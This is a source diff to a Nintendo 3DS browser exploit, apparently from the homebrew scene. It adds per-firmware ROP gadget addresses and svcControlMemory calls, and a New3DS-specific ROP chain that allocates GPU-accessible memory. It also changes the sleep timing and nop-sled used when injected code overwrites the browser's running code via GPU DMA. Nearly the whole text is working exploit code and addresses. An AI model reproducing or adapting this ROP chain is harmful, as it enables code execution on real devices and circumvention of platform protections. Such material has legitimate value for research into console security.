@@ -56,7 +56,7 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 
 #define MEMCPY 0x00150940
 
-#define SVCSLEEPTHREAD 0x0012b590
+#define svcSleepThread 0x0012b590
 
 #define GXLOW_CMD4 0x0014ac9c
 #endif
@@ -78,7 +78,7 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 
 #define MEMCPY 0x001536f8
 
-#define SVCSLEEPTHREAD 0x0012e64c
+#define svcSleepThread 0x0012e64c
 
 #define SRV_GETSERVICEHANDLE 0x00212de0
 
@@ -93,9 +93,13 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 
 #define ROP_LDRR1R1_STRR1R0 0x001f1ee4
 #define ROP_MOVR1R3_BXIP 0x001b8848
+
+#define ROP_INITOBJARRAY 0x0020a40d
+
 #define MEMCPY 0x001536a0
 
-#define SVCSLEEPTHREAD 0x0012e64c
+#define svcControlMemory 0x00212df0
+#define svcSleepThread 0x0012e64c
 
 #define SRV_GETSERVICEHANDLE 0x00212e48
 
@@ -106,22 +110,35 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 
 #if SYSVER == 94
 #define NSS_LaunchTitle 0x0022022c //inr0=procid out* inr1=unused inr2/inr3=u64 programid insp0=u8 mediatype
+
+#define svcControlMemory 0x002246b4
+
+#define ROP_INITOBJARRAY 0x002190a5
 #endif
 
 #if SYSVER == 93
 #define NSS_LaunchTitle 0x0022024c
+
+#define svcControlMemory 0x002246d4
+
+#define ROP_INITOBJARRAY 0x002190c5
 #endif
 
 #if SYSVER == 92
 #define NSS_LaunchTitle 0x0020e640
+
+#define svcControlMemory 0x00212d88
+
+#define ROP_INITOBJARRAY 0x0020a3a5
 #endif
 
 #define ROP_BXR1 POP_R4LR_BXR1+4
+#define ROP_BXLR ROP_LDR_R0FROMR0+4 //"bx lr"
 
 #if NEW3DS==0
 #define NSS_PROCLOADTEXT_LINEARMEMADR 0x36500000
 #else
-#define NSS_PROCLOADTEXT_LINEARMEMADR 0x36500000
+#define NSS_PROCLOADTEXT_LINEARMEMADR ((0x3d900000-0x400000))//+0x162000
 #endif
 
 .macro ROP_SETLR lr
@@ -239,12 +256,38 @@ nsslaunchtitle_programidlow_list:
 .word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ KOR
 .word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ TWN 
 
+tmp_scratchdata:
 .space 0x400
 
 ropstackstart:
 
 //Overwrite the top-screen framebuffers.
 CALL_GXCMD4 0x1f000000, 0x1f1e6000, 0x46800*2
+
+#if NEW3DS==1 //On New3DS the end-address of the GPU-accessible FCRAM area increased, relative to the SYSTEM-memregion end address. Therefore, in order to get the below process to run under memory that's GPU accessible, 0x400000-bytes are allocated here.
+ROP_SETLR POP_R2R6PC
+
+.word POP_R0PC
+.word HEAPBUF + (tmp_scratchdata - _start)  @ r0, outaddr*
+
+.word POP_R1PC
+.word 0x0f000000 @ r1, addr0
+
+.word POP_R2R6PC
+.word 0 @ r2, addr1
+.word 0x00400000 @ r3, size
+.word 0 @ r4
+.word 0 @ r5
+.word 0 @ r6
+
+.word svcControlMemory
+
+.word 0x3 @ r2 / sp0 (operation)
+.word 0x3 @ r3 / sp4 (permissions)
+.word 0 @ r4
+.word 0 @ r5
+.word 0 @ r6
+#endif
 
 ROP_SETLR POP_R2R6PC
 
@@ -302,12 +345,12 @@ CALL_GXCMD4 (HEAPBUF + (codedatastart - _start)), NSS_PROCLOADTEXT_LINEARMEMADR,
 ROP_SETLR ROP_POPPC
 
 .word POP_R0PC
-.word 0x0 @ r0
+.word 1000000000//0x0 @ r0
 
 .word POP_R1PC
-.word 0x100 @ r1
+.word 0x0//0x100 @ r1
 
-.word SVCSLEEPTHREAD @ Sleep 10 seconds. When the browser main-thread starts running, it runs for a while then stop running due to a context-switch triggered during .bss clearing. This allows that thread to resume running, at that point the code which was running(.bss clearing) would be already overwritten by the below code(initially it would execute the nop-sled).
+.word svcSleepThread @ Sleep 1 second. The rest of the text on this line is only relevant for Old3DS. When the browser main-thread starts running, it runs for a while then stop running due to a context-switch triggered during .bss clearing. This allows that thread to resume running, at that point the code which was running would be already overwritten by the below code(initially it would execute the nop-sled).
 
 .word POP_R1PC
 .word ROP_BXR1 @ r1
@@ -316,15 +359,20 @@ ROP_SETLR ROP_POPPC
 
 .word 0x58584148
 
-.align 3
+.align 4
 codedatastart:
+#if NEW3DS==0
 .space 0x200 @ nop-sled
+#else
+.space 0x200//0x1000
+#endif
 ldr r0, =0x58584148
 ldr r0, [r0]
 code_end:
 b code_end
 .pool
 
-.align 3
+.align 4
 codedataend:
+.word 0
 
